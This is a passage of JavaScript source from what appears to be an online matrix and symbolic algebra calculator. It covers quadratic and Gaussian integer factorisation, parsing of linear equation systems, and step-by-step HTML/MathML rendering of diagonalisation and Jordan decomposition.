          if (t.primeFactor().equals(t)) {
            return (new SquareRoot(x.multiply(ff)));
          }
          var k1 = new QuadraticInteger(1, 0, q.D);
          var k2 = new QuadraticInteger(1, 0, q.D);
          var i = t;
          var p = null;
          while (!i.equals(Expression.ONE)) {
            var d = i.primeFactor();
            if (p == null) {
              p = d;
            } else {
              if (p.equals(d)) {
                k1 = k1.multiply(d);
                p = null;
              } else {
                k2 = k2.multiply(p);
                p = d;
              }
            }
            i = i.truncatingDivide(d);
          }
          if (p != null) {
            k2 = k2.multiply(p);
          }
          return k1.toExpression().multiply(new Expression.SquareRoot(k2.toExpression().multiply(ff)));
        }
      }
    }
*/


/*

+    var y = evaluateExpression(e.a, context);
+    if (y === "CANNOT_DIVIDE" || y == null) {
+      return y;
+    }
+    //TODO: debug
+    var yy = new Interval(context.nthRoot(y.a, n).a, context.nthRoot(y.b, n).b);
+    var s = context.nthRoot(context.scalingCoefficient, n);
+    yy = context.divide(yy, context.multiply(Interval.degenerate(context.scalingCoefficient), s));
+    return yy;
*/







/*



// +1, -1, +i, -i
// a+bi

// a === 0, i*(a+bi)
// a < 0, -(a+bi)
// b < 0, i*(a+bi)

// a > 0, b > 0


/*
  for (var a = 1; a * a <= n; a += 1) {
    for (var b = 0; b * b <= n - a * a; b += 1) {
      if (norm(a, b) > 1 && hasDivisor(r, i, a, b)) {
        return [a, b];
      }
      if (norm(a, -b) > 1 && hasDivisor(r, i, a, -b)) {
        return [a, -b];
      }
    }
  }
  return [r, i];
*/

/*

function primeFactor(n) {
  var i = 2;
  var s = 0;
  var r = Math.floor(Math.sqrt(n + 0.5));
  while (i <= r) {
    if (n % i === 0) {
      return i;
    }
    i += s === 2 ? 2 : s + 1;
    s += 1;
    if (s === 4) {
      s = 2;
    }
  }
  return n;
}

function isPrime(n) {
  return primeFactor(n) === n;
}

function norm(x) {
  return x instanceof Expression.Integer ? x.multiply(x).value : x.multiply(x.conjugate()).value;
}

function checkFactorization(i) {
  var results = [];
  var x = i;
  while (norm(x) > 1) {
    var p = x.primeFactor();
    results.push(p);

    //A Gaussian integer a + bi is a Gaussian prime if and only if either:
    //  one of a, b is zero and absolute value of the other is a prime number of the form 4n + 3 (with n a nonnegative integer), or
    //  both are nonzero and a**2 + b**2 is a prime number (which will not be of the form 4n + 3).
    var n = norm(p);
    console.assert(isPrime(n) || ((p instanceof Expression.Integer || p.real.equals(Expression.ZERO) || p.imaginary.equals(Expression.ZERO)) && Math.abs(p instanceof Expression.Integer ? p : p.real.add(p.imaginary).value) % 4 === 3), n, p.toString());

    x = x.divide(p);
    if (x instanceof Expression.Integer && norm(x) > 1) {
      x = new Expression.Complex(Expression.ZERO, x);
    }
  }
  console.log(i + '=' + results.map(x => '(' + x + ')').join(''));
}


// 5-5i

checkFactorization(new Complex(new Expression.Integer(3), new Expression.Integer(3)));

checkFactorization(new Complex(new Expression.Integer(0), new Expression.Integer(2)));
checkFactorization(new Complex(new Expression.Integer(0), new Expression.Integer(-2)));
checkFactorization(new Complex(new Expression.Integer(5), new Expression.Integer(1)));

var A = 11;
for (var i = -A; i <= A; i += 1) {
  for (var j = -A; j <= A; j += 1) {
    if (j !== 0) {
      checkFactorization(new Complex(new Expression.Integer(i), new Expression.Integer(j)));
    }
  }
}


*/

/*
          if (i == null && isOnePlusSqrtOf2(y.a)) {
            i = y.a;
          }
          if (i == null) {
            throw new TypeError();
          }
          } else if (isOnePlusSqrtOf2(y.a)) {
            if (!p.equals(y.a)) {
              throw new TypeError();
            }
            degree += 1;

*/


// http://oeis.org/wiki/Quadratic_integer_rings
// https://oeis.org/A048981
// https://en.wikipedia.org/wiki/Euclidean_domain#Norm-Euclidean_fields
// https://en.wikipedia.org/wiki/Fundamental_unit_(number_theory)
// https://en.wikipedia.org/wiki/Pell%27s_equation
// https://en.wikipedia.org/wiki/Diophantine_equation
// https://ru.wikipedia.org/wiki/Гауссовы_целые_числа#Определение
// https://en.wikipedia.org/wiki/Gaussian_integer
// https://en.wikipedia.org/wiki/Prime_element


globalThis.QuadraticInteger = QuadraticInteger;



// ExpressionParser.parse('((17^0.5+7)**3)**(1/3)') + ''


//TODO: 
/*

*/

function AlmostQuadraticInteger(k, qi) { // k * qi
  if (k.isNegative() || k.equals(Expression.ONE) || k.equals(Expression.ZERO) || !(k instanceof Expression.Integer || k instanceof Expression.SquareRoot)) {
    throw new TypeError();
  }
  if (qi.a == 0) {
  //  throw new TypeError();
  }
  if (qi.b == 0) {
    throw new TypeError();
  }
  if (ngcd(qi.a, qi.b) != 1 && ngcd(qi.a, qi.b) != -1) {
    throw new TypeError();
  }
  this.k = k;
  this.qi = qi;
}

//AlmostQuadraticInteger.prototype = Object.create(null);

AlmostQuadraticInteger.prototype.toString = function () {
  return '(' + this.k + ')' + '*' + '(' + this.qi + ')';
};

AlmostQuadraticInteger.prototype.isValid = function () {
  return this.qi.isValid();
};

AlmostQuadraticInteger.prototype.isPositive = function () {
  return this.qi.isPositive();
};

AlmostQuadraticInteger.prototype.equals = function (y) {
  return this.qi.toExpression().multiply(this.k).equals(y.toExpression());
};
AlmostQuadraticInteger.prototype.primeFactor = function () {
  return this.k.toBigInt() !== this.qi.D ? this.k.primeFactor() : new QuadraticInteger(this.qi.D.constructor(0), this.qi.D.constructor(1), this.qi.D);
};
AlmostQuadraticInteger.prototype.isUnit = function () {
  return false;//!
};
AlmostQuadraticInteger.prototype.isDivisibleBy = function (y) {
  var g = y.toExpression().pow(Expression.TWO).gcd(this.k.pow(Expression.TWO)).squareRoot();
  var nk = this.k.divide(g);
  if (g instanceof Expression.SquareRoot && g.a.toBigInt() != y.D) {
    return this.qi.multiply(new QuadraticInteger(this.k.toBigInt(), y.D.constructor(0), this.qi.D)).isDivisibleBy(y);//?TODO: fix
  }
  return this.qi.isDivisibleBy(y.truncatingDivide(g instanceof Expression.SquareRoot ? new QuadraticInteger(this.qi.D.constructor(0), this.qi.D.constructor(1), g.a.toBigInt()) : g));
};
AlmostQuadraticInteger.prototype.truncatingDivide = function (y) {
  //TODO: Fix
  var g = y.toExpression().pow(Expression.TWO).gcd(this.k.pow(Expression.TWO)).squareRoot();
  var nk = this.k.divide(g);
  if (g instanceof Expression.SquareRoot && g.a.toBigInt() != y.D) {
    return this.qi.multiply(new QuadraticInteger(this.k.toBigInt(), y.D.constructor(0), this.qi.D)).truncatingDivide(y);//?TODO: fix
  }
  var nq = this.qi.truncatingDivide(y.truncatingDivide(g instanceof Expression.SquareRoot ? new QuadraticInteger(this.qi.D.constructor(0), this.qi.D.constructor(1), g.a.toBigInt()) : g));
  if (nq.b == 0) {
    // || nq.a == 0 - 2*sqrt(2)
    return nk.multiply(nq.toExpression());
  }
  if (nq.a == 0) {
    return nq.multiply(new QuadraticInteger(nk.toBigInt(), 0, nq.D));//?
  }
  return nk.equals(Expression.ONE) ? nq : new AlmostQuadraticInteger(nk, nq);
};
AlmostQuadraticInteger.prototype.remainder = function (y) {
  var g = y.toExpression().gcd(this.k);
  //TODO: ?
  var remainder = this.qi.remainder(y.truncatingDivide(g));
  if (remainder.equals(Expression.ZERO)) {
    return remainder;
  }
  if (remainder instanceof AlmostQuadraticInteger) {
    return new AlmostQuadraticInteger(this.k.multiply(remainder.k), remainder.qi);
  }
  var t = Expression.Integer.fromBigInt(abs(ngcd(remainder.a, remainder.b)));
  var nk = this.k.multiply(t);
  remainder = remainder.truncatingDivide(t);
  if (remainder.b == 0) {
    return nk.divide(g);
  }
  return this.k.equals(g) ? remainder : new AlmostQuadraticInteger(nk.divide(g), remainder);
};
AlmostQuadraticInteger.prototype.toExpression = function (y) {
  return this.qi.toExpression().multiply(this.k);
};

AlmostQuadraticInteger.prototype.isDivisibleByInteger = function (x) {
  return x.truncatingDivide(this) != null;
};

AlmostQuadraticInteger.prototype.truncatingDivideInteger = function (x) {
  return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.qi.D).truncatingDivide(this);
};

AlmostQuadraticInteger.prototype.remainderInteger = function (x) {
  return new QuadraticInteger(x.toBigInt(), Expression.ZERO.toBigInt(), this.qi.D).remainder(this);
};


// new QuadraticInteger(7, 1, 17).remainder(new QuadraticInteger(3, 1, 17))


})();
(function () {
"use strict";
/*jslint plusplus: true, vars: true, indent: 2, white: true */
/*global i18n*/








var RPN = ExpressionParser.parse;//TODO: fix
RPN.Context = ExpressionParser.Context;

var polynomialToExpression3 = function (matrix, row, variableSymbols) {
  var pivotColumn = 0;
  while (pivotColumn < matrix.cols() - 1 && matrix.e(row, pivotColumn).equals(Expression.ZERO)) {
    pivotColumn += 1;
  }
  if (pivotColumn === matrix.cols() - 1) {
    throw new TypeError();
  }
  var result = undefined;
  for (var i = pivotColumn; i < matrix.cols() - 1; i += 1) {
    var c = i === pivotColumn ? matrix.e(row, matrix.cols() - 1) : matrix.e(row, i).negate();
    var v = i === pivotColumn ? undefined : variableSymbols[i];
    if (!c.equals(Expression.ZERO)) {
      var current = v == undefined ? c : (c.equals(Expression.ONE) ? v : new Expression.Multiplication(c, v));
      result = result == undefined ? current : new Expression.Addition(result, current);
    }
  }
  return result == undefined ? Expression.ZERO : result;
};

RPN.toMathML = function (input, printOptions) {
  return ExpressionParser.parse(input, new ExpressionParser.Context()).toMathML(printOptions);
};

//Note: matrixTableState.inputValues were filled by `getInputValue`
RPN.getElementsArray = function (matrixTableState) {
  var mode = matrixTableState.mode;
  var type = matrixTableState.type;
  var textareaValue = matrixTableState.textareaValue;
  var inputValues = matrixTableState.inputValues;
  if (mode !== "cells") {
    //?
    //!!!
    if (type === "system") {// to support custom input in SLE: 3x+y-2z=2; 2x+y-1=3; ...
      try {
        var tmp = getAugmentedSystemMatrix(textareaValue);
        if (tmp != undefined) {
          return tmp;
        }
      } catch (error) {
        console.log(error);
      }
    }
    //!!!

    var resultRows = Matrix.split(textareaValue);
    return {elements: resultRows, variableNames: undefined};
  }
  return {elements: inputValues, variableNames: matrixTableState.variableNames};
};

var getSymbols = function (e) {
  if (e instanceof Expression.Symbol) {
    return [e];
  }
  if (e instanceof Expression.Integer) {
    return [];
  }
  if (e instanceof Expression.BinaryOperation) {
    var sa = getSymbols(e.a);
    var sb = getSymbols(e.b);
    return sa != null && sb != null ? sa.concat(sb) : null;
  }
  if (e instanceof Expression.Function) {
    return getSymbols(e.a);
  }
  return null;
};

var getAugmentedSystemMatrix = function (s) {
  //!2018-07-16
  s = s.replace(/[;,\r]/g, "\n");
  //!

      var lines = s.split("\n");
      var k = -1;
      var rows = [];
      var frees = [];
      var variableToColumnNumberMap = {};// string -> number
      var columnNumberToVariableMap = [];// number -> string

      var free = undefined;
      var row = undefined;
      var onVariable = function (coefficient, variable) {
        if (variable === "") {
          free = free.add(coefficient);
        } else {
          var columnIndex = variableToColumnNumberMap[variable];
          if (columnIndex == undefined) {
            columnIndex = columnNumberToVariableMap.length;
            variableToColumnNumberMap[variable] = columnIndex;
            columnNumberToVariableMap.push(variable);
          }
          while (row.length < columnIndex + 1) {
            row.push(Expression.ZERO);
          }
          row[columnIndex] = row[columnIndex].add(coefficient);
        }
      };

      var cvLists = new Array(lines.length);

      RPN.p = 0;//!
      while (++k < lines.length) {
        cvLists[k] = undefined;
        var line = lines[k];
        var x = line.split("=");
        if (x.length === 2) {
          //TODO: fix
          var leftString = x[0];
          var rightString = x[1];
          var left = ExpressionParser.parse(leftString);
          RPN.p += leftString.length;
          RPN.p += "=".length;
          var right = ExpressionParser.parse(rightString);
          RPN.p += rightString.length;
          RPN.p += "\n".length;
          var y = left.subtract(right).getNumerator();
          cvLists[k] = Expression.collectLinearEquationVariables(y);
        } else {
          RPN.p += line.length + "\n".length;
          if (line.replace(/^\s+|\s+$/g, "") !== "") { // to skip empty lines
            return undefined;
          }
        }
      }

      // second pass:
      var nonVariableSymbols = {};
      for (var i = 0; i < cvLists.length; i += 1) {
        if (cvLists[i] != undefined) {
          var list = cvLists[i];
          for (var j = 0; j < list.length; j += 1) {
            var symbols = getSymbols(list[j].c);
            if (symbols == null) {
              return undefined;
            }
            for (var k = 0; k < symbols.length; k += 1) {
              nonVariableSymbols[symbols[k]] = true;
            }
          }
        }
      }

      for (var i = 0; i < cvLists.length; i += 1) {
        if (cvLists[i] != undefined) {
          var list = cvLists[i];
          for (var j = 0; j < list.length; j += 1) {
            if (nonVariableSymbols[list[j].v] === true) {
              list[j] = {c: list[j].c.multiply(new Expression.Symbol(list[j].v)), v: ""};
            }
          }
        }
      }

      for (var i = 0; i < cvLists.length; i += 1) {
        if (cvLists[i] != undefined) {
          row = [];
          free = Expression.ZERO;
          var list = cvLists[i];
          for (var j = 0; j < list.length; j += 1) {
            onVariable(list[j].c, list[j].v);
          }
          frees.push(free);
          rows.push(row);
        }
      }

        var a = -1;
        while (++a < rows.length) {
          row = rows[a];
          while (row.length < columnNumberToVariableMap.length) {
            row.push(Expression.ZERO);
          }
          row.push(frees[a].negate());
        }
        var b = -1;
        while (++b < rows.length) {
          row = rows[b];
          var c = -1;
          while (++c < row.length) {
            row[c] = row[c].toString();//!slow?
          }
        }
        //!TODO: fix: reverse variables and coefficients, as Expression.collectLinearEquationVariables gives wrong order
        b = -1;
        while (++b < rows.length) {
          row = rows[b];
          var f = -1;
          var d = row.length - 1; // skipping free
          while (++f < --d) {
            var tmp = row[f];
            row[f] = row[d];
            row[d] = tmp;
          }
        }
        var newColumnNumberToVariableMap = []; // number -> Expression
        b = -1;
        while (++b < columnNumberToVariableMap.length) {
          newColumnNumberToVariableMap.push(columnNumberToVariableMap[columnNumberToVariableMap.length - 1 - b]);
        }
        columnNumberToVariableMap = newColumnNumberToVariableMap;
        
        //!
        return {elements: rows, variableNames: columnNumberToVariableMap};
};

Matrix.toMatrix = function (array) {
  var context = new ExpressionParser.Context();
  return Matrix.padRows(array, function (e) {
    return ExpressionParser.parse(e, context);
  });
};


// ---------------------------------------i18n.js-----------------------------------------

// i18n.rankDenotation
// i18n.sinDenotation
// i18n.tanDenotation
// TODO: denotations on the main page in information
ExpressionParser.addDenotations({
  rank: {
    bg: "ранг",
    de: "rang",
    en: "rank",
    es: "rango",
    fr: "rg",
    gl: "rango",
    it: "rango",
    pt: "posto",
    tr: "rank"
  },
  sin: {
    en: "sin",
    es: "sen"
  },
  tan: {
    en: "tan",
    ru: "tg",
    fr: "tg"
  },
  transpose: {
    es: "traspuesta"
  },
  determinant: {
    pt: "determinante"
  }
});

// --------------------------------------------- end ----------------------------------------------


var getResultAndHTML = function (expression, variableNames, result, printOptions) {
  // TODO: fix
  var resultHTML = "";
  if (result instanceof Expression.NoAnswerExpression) {
    var name = result.name;
    var matrix = result.a.matrix;
    var second = result.second;//!
    //result = undefined;
    if (name === "solve") {
      resultHTML = "";//TODO:
    } else {
      resultHTML = Expression.Details.getCallback(name)(printOptions, matrix, second == undefined ? variableNames : second);
    }
  } else if (result instanceof Expression.Equality) {
    //TODO: counter
    resultHTML = "";
    resultHTML += "<div>" + "<math>" + expression.toMathML(printOptions) + "</math>" + "</div>";
    resultHTML += "<div>" + "<math>" + result.toMathML(printOptions) + "</math>" + "</div>";
  } else {
    resultHTML = "<math>" + expression.toMathML(printOptions) + "<mo>=</mo>" + result.toMathML(printOptions) + "</math>";
  }
  return {
    result: result,
    html: resultHTML
  };
};

//? bestMethodsLimit - with highest priority
var createDetailsSummary = function (idPrefix, details, bestMethodsLimit) {
  bestMethodsLimit = bestMethodsLimit == undefined ? 1 : bestMethodsLimit;
  var s = "";
  for (var j = 0; j < details.length; j += 1) {
    //TODO: FIX
    //var rows = details[j].matrix.split("},").length;
    var countRows = function (s) {
      var state = 0;
      var result = 1;
      for (var i = 0; i < s.length; i += 1) {
        var c = s.charCodeAt(i);
        if (c === ",".charCodeAt(0)) {
          if (state === 1) {
            result += 1;
          }
        } else if (c === "{".charCodeAt(0)) {
          state += 1;
        } else if (c === "}".charCodeAt(0)) {
          state -= 1;
        }
      }
      return result;
    };
    var rows = countRows(details[j].matrix);
    //TODO: what if some `type` was provided?
    var type = details[j].type;
    var items = [];
    var edetails = Expression.Details.getAll(type, rows);
    for (var i = 0; i < edetails.length; i += 1) {
      var x = edetails[i];
          var jsonObject = [{
            type: x.type,
            matrix: details[j].matrix,
            second: details[j].second
          }];
          //TODO: Tree View - ?
          var item = "" +
               "<div class=\"details-container\">" +
               "<details data-id-prefix=\"" + idPrefix + "\" " + "data-details=\"" + Expression.escapeHTML(JSON.stringify(jsonObject)) + "\"" + ">" +
               "<summary>" + i18n.summaryLabel + (x.i18n != undefined ? " (" + x.i18n() + ")" : "") + "</summary>" +
               "<div class=\"indented\"></div>" +
               "</details>" + 
               "</div>";
          items.push(item);
    }
    var groupId = idPrefix + "-" + Expression.id();
    if (items.length > bestMethodsLimit + 1) {
      s += items.slice(0, bestMethodsLimit).join("");
      s += "<div id=\"" + groupId + "\" role=\"group\" hidden>";
      s += items.slice(bestMethodsLimit).join("");
      s += "</div>";
      s += "<button type=\"button\" class=\"more-button\" aria-expanded=\"false\" aria-controls=\"" + groupId + "\">&hellip;</button>";
    } else {
      s += items.join("");
    }
  }
  return s;
};

Expression.Minor = function (matrix, i, j) {
  Expression.Determinant.call(this, matrix);
  this.i = i;
  this.j = j;
};

Expression.Minor.prototype = Object.create(Expression.Determinant.prototype);

Expression.Minor.prototype.toMathML = function (options) {
  options = Object.assign({}, options, {
    horizontalStrike: this.i,
    verticalStrike: this.j,
    useBraces: ["|", "|"]
  });
  //TODO: fix
  return this.a.toMathML(options);
};

Expression.p = function (s, args, printOptions) {
  if (args == null && printOptions != null ||
      args != null && printOptions == null) {
    throw new TypeError();
  }
  args = args || null;
  printOptions = printOptions || null;
  var result = "";
  var parts = s.split("=");
  for (var i = 0; i < parts.length; i += 1) {
    var e = ExpressionParser.parse(parts[i], new ExpressionParser.Context(function (id) {
      return args != undefined && args[id] != undefined ? args[id] : undefined;
    }));
    if (i !== 0) {
      result += "<mo>" + (e.isExact() ? "=" : "&asymp;") + "</mo>";
    }
    result += e.toMathML(printOptions);
  }
  return result;
};

Expression.Details = function () {
};

Expression.Details.details = [];

Expression.Details.getCallback = function (type) {
  for (var i = 0; i < Expression.Details.details.length; i += 1) {
    if (Expression.Details.details[i].type === type) {
      return Expression.Details.details[i].callback;
    }
  }
  return undefined;
};

Expression.Details.add = function (data) {
  var x = {
    type: data.type,
    i18n: data.i18n,
    minRows: data.minRows == undefined ? 3 : data.minRows,
    maxRows: Math.min(data.maxRows == undefined ? 1 / 0 : data.maxRows, 4), // limit maxRows to reduce "de tricherie aux examens"
    priority: data.priority == undefined ? 1 : data.priority, // the number comparision should work 
    callback: data.callback
  };
  Expression.Details.details.push(x);
  var i = Expression.Details.details.length - 1;
  while (i >= 1 && Expression.Details.details[i - 1].priority < x.priority) {
    Expression.Details.details[i] = Expression.Details.details[i - 1];
    i -= 1;
  }
  Expression.Details.details[i] = x;

  //?
  if (x.type !== "multiply" && x.type !== "pow" && x.type !== "special-determinant") {
    ExpressionParser.addOperation(x.type, x.type === "expand-along-column" ||
                                          x.type === "expand-along-row" ||
                                          x.type === "obtain-zeros-in-column" ||
                                          x.type === "obtain-zeros-in-row" ||
                                          x.type === "polynomial-multiply" ||
                                          x.type === "multiply" ||
                                          x.type === "pow" ? 2 : 1);
  }
};

Expression.Details.getAll = function (typePrefix, rows) {
  var result = [];
  for (var i = 0; i < Expression.Details.details.length; i += 1) {
    var x = Expression.Details.details[i];
    if (x.type.indexOf(typePrefix) === 0 && rows >= x.minRows && rows <= x.maxRows) {
      result.push(x);
    }
  }
  return result;
};

Expression.Details.add({
  type: "steps-to-diagonalize",
  minRows: 2,
  callback: function (printOptions, matrix) {
    // TODO: move to details
    //TODO: details of determinant calculation, details of roots finding
    var html = "";
    html += "<ol>";
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;
    var multiplicities = tmp.multiplicities;
    html += "<li>";
    html += tmp.html;
    html += "</li>";

    // https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors#Algebraic_multiplicity
    if (Expression.sum(multiplicities) !== matrix.cols()) {
      //TODO: show polynomial in html anyway
      //TODO: fix message
      html += "</ol>";//TODO: fix
      //TODO: fix
      return html;
    }
    var tmp2 = Expression.getEigenvectorsWithSteps(printOptions, matrix, eigenvalues);
    html += "<li>";
    html += tmp2.html;
    html += "</li>";
    var eigenvectors = tmp2.eigenvectors;
  //  html += "</ol>";

    if (eigenvectors.length !== matrix.cols()) {
      //TODO: show polynomial in html anyway
      html += "</ol>";//TODO: fix
      //TODO: fix
      return html;
    }

    var results = Expression.diagonalize(matrix, eigenvalues, multiplicities, eigenvectors);
    var T = results.T;
    var L = results.L;
    var T_INVERSED = results.T_INVERSED;
    

    html += "<li>";
    html += "<ul>";

    html += "<li>";
    var eigenvaluesLinks = "";
    for (var i = 0; i < eigenvalues.length; i += 1) {
      var multiplicity = multiplicities[i];
      for (var j = 0; j < multiplicity; j += 1) {
        eigenvaluesLinks += i === 0 && j === 0 ? "" : ", ";
        eigenvaluesLinks += "<a href=\"#" + printOptions.idPrefix + "-eigenvalue-" + (i + 1) + "\"><math>" + Expression.p("\\lambda_" + (i + 1)) + "</math></a>";
      }
    }
    html += "<div>" + i18n.theDiagonalMatrixTheDiagonalEntriesAreTheEigenvalues.replace(/\$\{eigenvaluesLinks\}/g, eigenvaluesLinks) + "</div>";
    html += "<math>" + Expression.p("D=M", {M: new Expression.Matrix(L)}, printOptions) + "</math>";
    html += "</li>";

    html += "<li>";
    var eigenvectorsLinks = "";
    for (var i = 0; i < eigenvectors.length; i += 1) {
      eigenvectorsLinks += i === 0 ? "" : ", ";
      eigenvectorsLinks += "<a href=\"#" + printOptions.idPrefix + "-eigenvector-" + (i + 1) + "\"><math>" + Expression.p("v_" + (i + 1)) + "</math></a>";
    }
    html += "<div>" + i18n.theMatrixWithTheEigenvectorsAsItsColumns.replace(/\$\{eigenvectorsLinks\}/g, eigenvectorsLinks) + "</div>";
    html += "<math>" + Expression.p("P=M", {M: new Expression.Matrix(T)}, printOptions) + "</math>";
    html += "</li>";

    html += "<li>";
    html += "<math>" + Expression.p("P^-1=M", {M: new Expression.Matrix(T_INVERSED)}, printOptions) + "</math>";
    html += createDetailsSummary(printOptions.idPrefix, [{type: T.getDeterminantEventType("inverse").type, matrix: T.toString(), second: undefined}]);
    html += "</li>";

    html += "<li>";
    html += "<math>" + Expression.p("A=P*D*P^-1") + "</math>";
    html += " ";
    html += i18n.matrixDiagonalizationLink;
    html += "</li>";

    html += "</ul>";
    html += "</li>";

    html += "</ol>";
    return html;
  }
});

Expression.Details.add({
  type: "diagonalize",
  minRows: 2,
  callback: function (printOptions, matrix) {
    var tmp = Expression.getEigenvalues(matrix);
    var eigenvalues = tmp.eigenvalues;
    var multiplicities = tmp.multiplicities;
    //TODO: fix
    var detailsHTML = createDetailsSummary(printOptions.idPrefix, [{type: 'steps-to-diagonalize', matrix: matrix.toString(), second: undefined}]);
    if (Expression.sum(multiplicities) !== matrix.cols()) {
      return "<div>" + i18n.notEnoughRationalEigenvalues + "</div>" + detailsHTML;
    }
    var tmp = Expression.getEigenvectors(matrix, eigenvalues);
    var eigenvectors = tmp.eigenvectors;
    if (eigenvectors.length !== matrix.cols()) {
      // The matrix is not diagonalizable, because it does not have {n} linearly independent eigenvectors.
      var message = i18n.notDiagonalizable.replace(/\$\{n\}/g, matrix.cols());
      //!2019-04-18
      message += " " + "<small>" + i18n.tryToFindJordanNormalForm.replace(/\*([^\*]+)\*/g, '<a href="#Jordan-decomposition(' + matrix.toString() + ')">$1</a>') + "</small>";
      //!
      return "<div>" + message + "</div>" + detailsHTML;
    }
    var results = Expression.diagonalize(matrix, eigenvalues, multiplicities, eigenvectors);

    //var detailsHTML = "<div class=\"details-container\"><details open=\"open\"><summary>" + i18n.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details></div>";
    var resultHTML = "<math>" +
                     new Expression.Matrix(matrix).toMathML(printOptions) +
                     "<mo>" + (results.L.isExact() ? "=" : "&asymp;") + "</mo>" +
                     "<mrow>" +
                     new Expression.Matrix(results.T).toMathML(printOptions) +
                     "<mo>&times;</mo>" +
                     new Expression.Matrix(results.L).toMathML(printOptions) +
                     "<mo>&times;</mo>" +
                     new Expression.Matrix(results.T_INVERSED).toMathML(printOptions) +
                     "</mrow>" +
                     "</math>";
    //result = results.T;
    return resultHTML + detailsHTML;
  }
});

//!2018-10-03
Expression.Details.add({
  type: "Jordan-decomposition",
  minRows: 2,
  callback: function (printOptions, matrix) {
  
    var tmp = Expression.getEigenvaluesWithSteps(printOptions, matrix);
    var eigenvalues = tmp.eigenvalues;
    var multiplicities = tmp.multiplicities;
    if (Expression.sum(multiplicities) !== matrix.cols()) {
      //TODO: allow complex roots
      //TODO: show polynomial in html anyway
      //TODO: fix message
      var html = undefined;//!
      html = tmp.html;
      var detailsHTML = "<div class=\"details-container\"><details open=\"open\"><summary>" + i18n.summaryLabel + "</summary><div class=\"indented\">" + html + "</div></details></div>";
      return "<div>" + i18n.notEnoughRationalEigenvalues + "</div>" + detailsHTML;
    }
    //var results = Expression.getFormaDeJordan(matrix, eigenvalues, multiplicities);
    //TODO: solution steps

    //TODO: merge with `Expression.getFormaDeJordan`
    //TODO: i18n
    //TODO: hide <details>, compute on demand
    //TODO: better details (links to vectors, subdetails for solution of systems)
    function getSolutionSet(matrix) {
      var fullMatrix = matrix.augment(Matrix.Zero(matrix.cols(), 1));
      var result = fullMatrix.toRowEchelon(Matrix.GaussMontante, "solving", undefined);
      var tmp = Matrix.solveByGaussNext(result.matrix);
      var currentEigenvectors = Matrix.getSolutionSet(tmp).basisVectors;
      return currentEigenvectors;//?
    }
    function matrixFromBlocks(blocks) {
      var start = 0;
      var J = Matrix.Zero(n, n);
      for (var i = 0; i < blocks.length; i += 1) {
        var b = blocks[i];
        J = J.map(function (e, i, j) {
          if (i >= start && i < start + b.size) {
            return i === j ? b.eigenvalue : (i !== start + b.size - 1 && j === i + 1 ? Expression.ONE : Expression.ZERO);
          }
          return e;
        });
        start += b.size;
      }
      return J;
    }
    function matrixFromBasis(basis) {
      if (basis.length === 0) {
        throw new Error();
      }
      return Matrix.Zero(basis.length, basis[0].rows()).map(function (e, i, j) {
        return basis[i].e(j, 0);
      });
    }
    function isSolution(coefficientMatrix, vector) {
      var f = coefficientMatrix.multiply(vector);
      if (f.cols() !== 1) {
        throw new RangeError("assertion failed");
      }
      for (var i = 0; i < f.rows(); i += 1) {
        if (!f.e(i, 0).equals(Expression.ZERO)) {
          return false;
        }
      }
      return true;
    }
    function isLinearlyIndependentSet(basis, vectors) {
      // https://math.stackexchange.com/questions/412563/determine-if-vectors-are-linearly-independent
      return matrixFromBasis(basis.concat(vectors)).rank() === basis.length + vectors.length;
    }

    var containerId = printOptions.idPrefix + "-" + Expression.id();
    var links = [];

    var basis = [];
    var blocks = [];
    var A = matrix;
    var n = A.cols();
    var po = printOptions;
    var html = '';

    html += '<h3>' + i18n.findAMatrixInJordanNormalFormSimilarToOriginal + ' ' + i18n.JordanDecompositionLink + '</h3>';
    html += '<ol>';
    html += '<li>';
    html += '<h4>' + i18n.solveTheCharacteristicEquationForEigenvaluesAndTheirAlgebraicMultiplicities + '</h4>';
    html += tmp.html;
    html += '</li>';
    html += '<li>';
    html += '<h4>' + i18n.findLinearlyIndependentGeneralizedEigenvectorsForEveryEigenvalue + '</h4>';
    html += '<ol>';
    for (var i = 0; i < eigenvalues.length; i += 1) {
      html += '<li>';
      var basisCorrespondingToTheEigenvalue = [];
      var eigenvalue = eigenvalues[i];
      var algebraicMultiplicity = multiplicities[i];
      var B = A.subtract(Matrix.I(n).scale(eigenvalue));
      html += '<h5>';
      html += i18n.eigenvalue + ' ' + '<math>' + Expression.p('\\lambda_' + (i + 1) + '=v', {v: eigenvalue}, printOptions) + '</math>' + ', ' + i18n.algebraicMultiplicity + ' ' + '<math>' + Expression.p('\\mu_' + (i + 1) + '=' + algebraicMultiplicity) + '</math>';
      html += '</h5>';
      
      html += '<p>' + i18n.determineTheMaximalRankOfGeneralizedEigenvectors + '</p>';
      var m = 0;
      html += '<ul>';
      do {
        m += 1;
        html += '<li>';
        var rank = B.pow(m).rank();
        html += '<math>' + Expression.p('rank(A-l*I)**' + m + '=' + rank, {A: new Expression.Matrix(matrix), l: eigenvalue}, printOptions) + '</math>';
        html += '</li>';
      } while (B.pow(m).rank() > n - algebraicMultiplicity);
      html += '</ul>';
      m += 1;
      html += '<p>' + i18n.determineEachJordanChain + '</p>';
      html += '<ol>';
      while (--m >= 1) {
        html += '<li>';
        html += i18n.findSolutionsOfX.replace(/\$\{X\}/g, '<math>' + Expression.p('(A-l*I)**' + m + '*X=0', {A: new Expression.Matrix(matrix), l: eigenvalue}, printOptions) + '</math>');
        var solutionSet = getSolutionSet(B.pow(m));

        html += '<div>';
        html += i18n.aBasisForTheSolutionSet + ' ';
        html += '<math>';
        html += '<mrow>';
        html += '<mo stretchy="false">{</mo>';
        html += solutionSet.length !== 1 ? '<mrow>' : '';
        for (var j = 0; j < solutionSet.length; j += 1) {
          var solution = solutionSet[j];
          if (j !== 0) {
            html += '<mo>,</mo>';
          }
          html += new Expression.Matrix(solution).toMathML(printOptions);
        }
        html += solutionSet.length !== 1 ? '</mrow>' : '';
        html += '<mo stretchy="false">}</mo>';
        html += '</mrow>';
        html += '</math>';
        html += '</div>';

        html += '<ol>';
        for (var j = 0; j < solutionSet.length; j += 1) {
          var solution = solutionSet[j];
          html += '<li>';
          html += '<h6>';
          html += '<math>' + Expression.p('x_' + (j + 1) + '=v', {v: new Expression.Matrix(solution)}, printOptions) + '</math>';
          html += '</h6>';
          if (!isSolution(B.pow(m - 1), solution)) {
